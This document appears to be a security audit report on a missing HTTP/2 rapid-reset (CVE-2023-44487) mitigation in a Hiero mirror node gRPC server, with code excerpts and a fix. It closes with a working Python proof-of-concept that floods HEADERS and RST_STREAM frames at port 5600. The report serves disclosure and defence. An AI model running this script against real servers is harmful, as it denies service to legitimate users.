### Title
HTTP/2 Rapid Reset (CVE-2023-44487) DoS via Missing RST_STREAM Rate Limiting in `grpcServerConfigurer()`

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures the Netty gRPC server with only `maxConcurrentCallsPerConnection(5)` and no `maxRstFramesPerWindow()` call. This leaves the server without any RST_STREAM rate limiting, allowing an unprivileged attacker to perform the HTTP/2 rapid reset attack (CVE-2023-44487) by rapidly cycling HEADERS+RST_STREAM frame pairs, exhausting CPU and thread pool resources and degrading or denying service to legitimate gRPC consumers.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35:
```java
@Bean
ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
        GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
    final var nettyProperties = grpcProperties.getNetty();
    return serverBuilder -> {
        serverBuilder.executor(applicationTaskExecutor);
        serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    };
}
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, lines 11–15:
```java
public class NettyProperties {
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**Root cause:** `NettyServerBuilder.maxRstFramesPerWindow()` — the grpc-java API (available since 1.58.0, project uses 1.80.0 per `build.gradle.kts` line 22) specifically designed to mitigate CVE-2023-44487 — is never called. A codebase-wide grep for `maxRstFrames`, `RST_STREAM`, and `rapid.reset` returns zero matches, confirming no compensating control exists anywhere in the server configuration.

**Exploit flow:**
1. Attacker establishes one or more HTTP/2 connections to port 5600 (publicly exposed gRPC port).
2. For each connection, attacker sends a HEADERS frame (opening stream N) immediately followed by RST_STREAM for stream N, in a tight loop.
3. The Netty HTTP/2 layer processes each HEADERS frame — allocating stream state, dispatching to the `applicationTaskExecutor` thread pool — before the RST_STREAM arrives and cancels the stream.
4. The server performs setup work (stream allocation, gRPC call dispatch, cancellation handling) for every cycle with no rate limit.
5. With multiple source IPs or connections, the attacker multiplies the effect linearly.

**Why `maxConcurrentCallsPerConnection(5)` is insufficient:** This limit caps the number of *simultaneously active* gRPC calls per connection. In the rapid reset pattern, streams are opened and immediately cancelled, so the active count stays low while the *rate* of stream creation/cancellation is unbounded. The server still processes every HEADERS frame at the HTTP/2 layer before the gRPC layer can reject it. The 5-call limit does not bound the per-second rate of stream churn.

### Impact Explanation
The gRPC server at port 5600 serves HCS topic subscriptions and address book queries. Sustained rapid reset traffic saturates the `applicationTaskExecutor` thread pool and Netty I/O threads with stream setup/teardown work, causing legitimate query requests to queue and time out. This constitutes a denial-of-service against the gRPC API layer, disrupting availability of topic subscription and smart contract event query services. No authentication or funds are required to trigger this condition.

### Likelihood Explanation
The attack requires only a standard HTTP/2 client (e.g., `h2load`, a custom Go/Python script) and network access to port 5600. No credentials, tokens, or privileged access are needed. CVE-2023-44487 is publicly documented with working proof-of-concept tooling. The attack is repeatable, stateless, and can be launched from a single host or amplified across multiple IPs. The grpc module's public-facing deployment (Kubernetes `GatewayPolicy` with `maxRatePerEndpoint: 250` at the gateway level per `charts/hedera-mirror-grpc/values.yaml` line 69) provides only coarse rate limiting at the application-request level, not at the HTTP/2 frame level where the attack operates.

### Recommendation
In `grpcServerConfigurer()`, add a call to `serverBuilder.maxRstFramesPerWindow()` with a conservative limit. The grpc-java documentation recommends starting with 200 RST frames per 30 seconds per connection as a baseline:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    serverBuilder.maxRstFramesPerWindow(
        nettyProperties.getMaxRstFramesPerWindow(),   // e.g. 200
        nettyProperties.getRstFramesWindowNanos(),    // e.g. 30_000_000_000L
        TimeUnit.NANOSECONDS);
};
```

Add the corresponding fields to `NettyProperties` with sensible defaults. Additionally, consider enabling connection-level rate limiting at the load balancer/ingress layer as a defense-in-depth measure.

### Proof of Concept
```python
# Requires: pip install h2 hyper
import socket, h2.connection, h2.config, h2.events, time

TARGET_HOST = "<grpc-server-ip>"
TARGET_PORT = 5600

sock = socket.create_connection((TARGET_HOST, TARGET_PORT))
# Wrap with TLS if needed

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
sock.sendall(conn.data_to_send(65535))

headers = [
    (':method', 'POST'),
    (':path', '/com.hedera.mirror.api.proto.ConsensusService/subscribeTopic'),
    (':scheme', 'http'),
    (':authority', f'{TARGET_HOST}:{TARGET_PORT}'),
    ('content-type', 'application/grpc'),
    ('te', 'trailers'),
]

stream_id = 1
start = time.time()
count = 0
while time.time() - start < 30:
    conn.send_headers(stream_id, headers)
    conn.reset_stream(stream_id)          # RST_STREAM immediately
    sock.sendall(conn.data_to_send(65535))
    stream_id += 2                        # HTTP/2 client streams are odd
    count += 1

print(f"Sent {count} HEADERS+RST_STREAM pairs in 30s")
# Observe: server CPU spikes, legitimate subscribers experience timeouts
```
